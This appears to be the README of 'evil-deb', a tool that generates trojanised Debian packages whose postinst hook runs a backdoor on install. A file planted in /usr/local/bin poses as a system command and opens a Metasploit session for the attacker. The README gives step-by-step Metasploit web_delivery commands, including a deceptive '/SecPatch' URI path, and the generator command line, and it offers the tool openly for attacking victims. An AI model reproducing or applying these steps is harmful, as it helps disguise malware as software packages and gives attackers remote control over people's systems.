# _______          _________ _         ______   _______  ______  
#(  ____ \|\     /|\__   __/( \       (  __  \ (  ____ \(  ___ \ 
#| (    \/| )   ( |   ) (   | (       | (  \  )| (    \/| (   ) )
#| (__    | |   | |   | |   | | _____ | |   ) || (__    | (__/ / 
#|  __)   ( (   ) )   | |   | |(_____)| |   | ||  __)   |  __ (  
#| (       \ \_/ /    | |   | |       | |   ) || (      | (  \ \ 
#| (____/\  \   /  ___) (___| (____/\ | (__/  )| (____/\| )___) )
#(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 0.6v.
#                                                               
#                         Malicious Debain Package Creator
#                         WebSite :: http://haxkur1.mozello.com/
#			     By: @Killerpop

# evil-deb - Malicious Debian Package generator
Script to generate malicious debian packages (debain trojans).

#evil-debis a script which generates Malicious debian package for metasploit
    which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
    
    Backdoor gets executed just when victim tries to install deb package due to postinst file
    
    Bash file injects and also acts like some system command which when executed by victim 
    and attacker hits with session.
    
    Plus Points :
    -- Fully indiependent. Means user no need to install any debian package creator
    -- Can be integrated with any payload generator easily due to engagements of arguemt 
    
    evil-deb basically depends upon web_delivery module and every thing is automated. 
    all the attacker needs is to do following settings :
    
    Setting up Web_Delivery in msf :
    
    msf > use exploit/multi/script/web_delivery
    msf exploit(web_delivery) > set srvhost 192.168.0.2
    srvhost => 192.168.0.102
    msf exploit(web_delivery) > set uripath /SecPatch
    uripath => /SecPatch
    msf exploit(web_delivery) > set Lhost 192.168.0.2
    Lhost => 192.168.0.102
    msf exploit(web_delivery) > show options
    msf exploit(web_delivery) > exploit
    
    Generating Malicious payload :
    
    root@killerpop ~/Desktop/projects/evil-deb $ sudo python evil-deb.py -n nano -l 127.0.0.1 -V 1.0 -a i386
    
    NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
    It can be used standalone also all user needs is to change uripath in msf variables
    -------------------------------------------------------------------------------------
    
    Tested on :
                Linux Mint 17.2 Cinnamon (Ubuntu 14.04) 
                ParrotOS (Debian Jessie)
                Kali Rolling 2017.3
# Updates :::
       0.6v.
   